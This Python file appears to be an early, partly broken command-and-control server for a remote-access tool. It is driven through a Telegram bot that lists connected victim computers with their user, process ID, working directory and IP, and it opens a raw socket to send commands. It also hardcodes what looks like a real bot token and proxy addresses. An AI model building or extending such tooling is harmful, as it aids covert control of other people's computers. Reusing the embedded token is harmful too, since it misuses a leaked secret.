import telebot, aiogram
from telebot import apihelper # Нужно для работы Proxy
from http.server import BaseHTTPRequestHandler

import os
from random import randint as ri

def prety(clients):
    q = ""
    strin = {'alias': 5, 'ops': 3, 'user': 4, 'pid': 3, 'pwd': 3, 'clientip': 8}
    stri = '│ alias │ ops │ user │ pid │ pwd │ clientip │'

    for i in clients:
        o = 5
        head = '┌'
        bottom = '└'
        c = clients[i]
        k = c.__dict__
        for el in k:
            if 'cle' in el:
                name = el.split('_')[0]
                strin[name] = max(strin[name], len(k[el]))
                o += strin[name] + 2
                head += '─' * (strin[name] + 2) + '┬'
                bottom += '─' * (strin[name] + 2) + '┴'

        head = head[0:-1] + '┐'
        bottom = bottom[0:-1] + '┘'

    if clients != {}:
        s = '├'

        q += head + "\n"

        for word in stri.split('│')[1:-1]:
            word = word[1:-1]
            q += ('│' + ' ' * (strin[word] - len(word) + 1) + word + ' ')
            s += '─' * (strin[word] + 1) + '─' + '┼'
        s = s[0:-1] + '┤'
        q += '│' + "\n"

        for i in clients:
            q += s + "\n"
            q += '│'
            c = clients[i]
            k = c.__dict__

            for el in k:
                if 'cle' in el:
                    q += (' ' * (strin[el.split('_')[0]] + 1 - len(k[el])) + f'{k[el]} │')
            q += "\n"
        q += bottom + "\n"
    else:
        q += ('┌' + '─' * 6 + '┐' + "\n")
        q += ('│ None │' + "\n")
        q += ('└' + '─' * 6 + '┘' + "\n")
    return q


class Connect(BaseHTTPRequestHandler):
    global req_head
    def __init__(self, ops_cle='windows', user_cle='', pid_cle='', pwd_cle='', clientip_cle='', server_address=(), alias_cle=''):
        # super(Connect, self).__init__()
        self.alias_cle = alias_cle
        self.ops_cle = ops_cle
        self.user_cle = user_cle
        self.pid_cle = pid_cle
        self.pwd_cle = pwd_cle
        self.s = ''
        self.cont = ''
        self.serv_ip = server_address[0]
        self.serv_port = server_address[1]
        self.server_address = server_address
        self.clientip_cle = clientip_cle
        self.client = ''
        self.addr = ''

    def initiate(self):
        self.s = socket.socket(socket.AF_INET, socket.SOCK_STREAM, 0)
        self.s.bind((self.server_address))
        self.s.listen(5)
        # self.s = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
        # self.s.load_cert_chain("D:\\certs\\cert.pem", "D:\\certs\\key.pem")
        # self.s = s.wrap_socket(ss, server_side=True)
        self.client, self.addr = self.s.accept()

    def send(self, cmd=''):
        self.client.send(cmd.encode('cp65001'))

    def recv(self):
        return self.client.recv(1024).decode('cp65001')

    def close(self):
        self.s.close()


def help():
    return (r"""
comps - display connected computers
connect [-A] - connect to computer with alias
alias [-pr_A] [-new_A] - rename connection from A to B
    """)


def check_clients(clients):
    try:
        with open("temp.db", "r", encoding="utf-8") as f:
            data = f.read().split("\n")
            for el in data:
                el = el.split("|")
                id = el[0]
                clients[id] = dict(el[-1])
            f.close()
        os.remove("temp.db")
        return clients
    except:
        return clients


clients = {}

token = '6086061913:AAHiEN1JDxrdJnsm0KFcfygTK8nyjRvBIZ4'
# proxy = ('socks5://189.100.122.140:35759/', 'socks5://75.110.224.94:45554/', 'socks5://189.63.89.168:43216/', 'socks5://50.30.205.71:45554/', '')[ri(0,3)]
# proxy = 'socks5h://geek:socks@t.geekclass.ru:7777'
proxy = 'socks5://79.104.34.214:1080'

# bot = aiogram.Bot(token=token, proxy=proxy)
apihelper.proxy = {'https': proxy}  # Передаём Proxy из файла config.py
bot = telebot.TeleBot(token)  # Передаём токен из файла config.py

# Тут работаем с командой start
@bot.message_handler(commands=['start'])
def welcome_start(message):
    bot.send_message(message.chat.id, 'Приветствую тебя user')


# Тут работаем с командой help
@bot.message_handler(commands=['hosts'])
def welcome_help(message):
    bot.send_message(message.chat.id, "NaN")

@bot.message_handler(commands=['check'])
def check(message):
    global clients
    clients = check_clients(clients)
    print(clients)
    bot.send_message(message.chat.id, prety(clients))

bot.polling()